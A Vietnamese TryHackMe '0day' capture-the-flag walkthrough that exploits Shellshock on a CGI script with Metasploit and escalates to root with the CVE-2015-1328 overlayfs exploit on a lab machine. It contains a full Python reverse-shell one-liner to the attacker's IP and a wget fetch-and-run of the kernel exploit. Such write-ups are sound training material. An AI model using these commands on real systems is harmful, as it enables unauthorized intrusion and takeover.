@@ -1,0 +1,247 @@
+---
+title: "Tryhackme - 0day"
+date: "2022-05-16"
+tags: [
+    "web",
+    "linux",
+	"shellshock",
+    "CVE-2015-1328",
+    "python",
+    "gcc"
+]
+---
+
+[TryHackMe - 0day](https://tryhackme.com/room/0day)
+
+## Reconnaissance and Scanning
+
+```python
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
+|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
+|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
+|   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: 0day
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Chỉ có port 80 với web service là đáng quan tâm hơn. 
+
+Sau khi thử qua vài kỹ thuật cơ bản và không có kết quả, tôi thử tìm path của web này
+
+```python
+[12:34:40] 301 -  313B  - /admin  ->  http://10.10.236.120/admin/         
+[12:34:41] 200 -    0B  - /admin/                                         
+[12:34:41] 200 -    0B  - /admin/?/login                                  
+[12:34:41] 403 -  295B  - /admin/.htaccess                                
+[12:34:42] 200 -    0B  - /admin/index.html                               
+[12:34:56] 301 -  314B  - /backup  ->  http://10.10.236.120/backup/       
+[12:34:56] 200 -    2KB - /backup/                                        
+[12:35:00] 301 -  315B  - /cgi-bin  ->  http://10.10.236.120/cgi-bin/     
+[12:35:00] 403 -  288B  - /cgi-bin/
+[12:35:00] 200 -   13B  - /cgi-bin/test.cgi                               
+[12:35:05] 301 -  311B  - /css  ->  http://10.10.236.120/css/             
+[12:35:18] 301 -  311B  - /img  ->  http://10.10.236.120/img/             
+[12:35:19] 200 -    3KB - /index.html                                     
+[12:35:21] 200 -  928B  - /js/                                            
+[12:35:42] 200 -   38B  - /robots.txt                                     
+[12:35:43] 200 -  109B  - /secret/                                        
+[12:35:43] 301 -  314B  - /secret  ->  http://10.10.236.120/secret/
+```
+
+Có 1 path làm tôi quan tâm là `/cgi-bin/test.cgi`. Khi thử vào path này tôi được `Hello World`. Đây là một lỗ hổng mang tên [shellshock](https://github.com/erinzm/shellshocker). Tôi sẽ thử dùng nó để khai thác
+
+## RCE
+
+```python
+┌──(root㉿kali)-[/home/kali]
+└─# git clone https://github.com/erinzm/shellshocker.git
+
+┌──(root㉿kali)-[/home/kali]
+└─# cd shellshocker
+
+┌──(root㉿kali)-[/home/kali/shellshocker]
+└─# python shellshocker.py http://10.10.236.120/cgi-bin/test.cgi
+Testing http://10.10.236.120/cgi-bin/test.cgi with a standard payload using ShellShocker
+http://10.10.236.120/cgi-bin/test.cgi is exploitable
+```
+
+Điều này có nghĩa là lỗ hổng này có thể khai thác được. Tôi sẽ dựa vào [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi#exploit) để lấy RCE
+
+```python
+┌──(root㉿kali)-[/home/kali/shellshocker]
+└─# msfconsole -q 
+msf6 > use multi/http/apache_mod_cgi_bash_env_exec
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options
+
+Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   CMD_MAX_LENGTH  2048             yes       CMD max line length
+   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent       yes       HTTP header to use
+   METHOD          GET              yes       HTTP method to use
+   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
+   RPORT           80               yes       The target port (TCP)
+   SSL             false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI                        yes       Path to CGI script
+   TIMEOUT         5                yes       HTTP read response timeout (seconds)
+   URIPATH                          no        The URI to use for this exploit (default is random)
+   VHOST                            no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.141.129  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 10.10.236.120
+rhosts => 10.10.236.120
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/test.cgi
+targeturi => /cgi-bin/test.cgi
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost 10.8.105.194
+lhost => 10.8.105.194
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
+
+[*] Started reverse TCP handler on 10.8.105.194:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (1017704 bytes) to 10.10.236.120
+[*] Meterpreter session 1 opened (10.8.105.194:4444 -> 10.10.236.120:51388) at 2023-07-27 12:48:35 -0400
+
+meterpreter > 
+```
+
+RCE thành công. Sử dụng payload Python3#2 của [Reverse Shell Generator](https://www.revshells.com/)
+
+Tạo listener với port 9001
+
+```python
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 9001 
+```
+
+Sao chép payload vào meterpreter
+
+```python
+meterpreter > shell
+Process 1070 created.
+Channel 1 created.
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.105.194",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+Quay trở lại listener
+
+```python
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 9001                
+listening on [any] 9001 ...
+connect to [10.8.105.194] from (UNKNOWN) [10.10.236.120] 55265
+www-data@ubuntu:/usr/lib/cgi-bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ubuntu:/usr/lib/cgi-bin$ 
+www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
+cd /home
+www-data@ubuntu:/home$ ls 
+ls
+ryan
+www-data@ubuntu:/home$ ls ryan
+ls ryan
+user.txt
+www-data@ubuntu:/home$ cat ryan/user.txt
+cat ryan/user.txt
+THM{Sh3llSh0ck_r0ckz}
+www-data@ubuntu:/home$ 
+```
+
+## Privilege escalation
+
+Kiểm tra một chút về máy này
+
+```python
+www-data@ubuntu:/tmp$ uname -a
+uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+Tìm kiếm các lỗ hổng có liên quan đến phiên bản OS này và tôi tìm ra nó ở [exploit-db](https://www.exploit-db.com/exploits/37292). Exploit này viết bằng C và sau đó biên dịch ra file ELF. File này cũng đã được public ở [đây](https://github.com/SecWiki/linux-kernel-exploits/blob/master/2015/CVE-2015-1328/ofs_32)
+
+Tải nó về và tạo http server để tải nó lên máy 
+
+```python
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# python -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+```
+
+```python
+www-data@ubuntu:/tmp$ wget http://10.8.105.194:8888/ofs_32
+wget http://10.8.105.194:8888/ofs_32
+--2023-07-27 10:31:47--  http://10.8.105.194:8888/ofs_32
+Connecting to 10.8.105.194:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 746008 (729K) [application/octet-stream]
+Saving to: 'ofs_32'
+
+100%[======================================>] 746,008      625KB/s   in 1.2s   
+
+2023-07-27 10:31:48 (625 KB/s) - 'ofs_32' saved [746008/746008]
+```
+
+Exploit
+
+```python
+www-data@ubuntu:/tmp$ chmod +x ofs_32
+chmod +x ofs_32
+www-data@ubuntu:/tmp$ ./ofs_32
+./ofs_32
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+id
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# cat /root/root.txt
+cat /root/root.txt
+THM{g00d_j0b_0day_is_Pleased}
+# 
+```
+
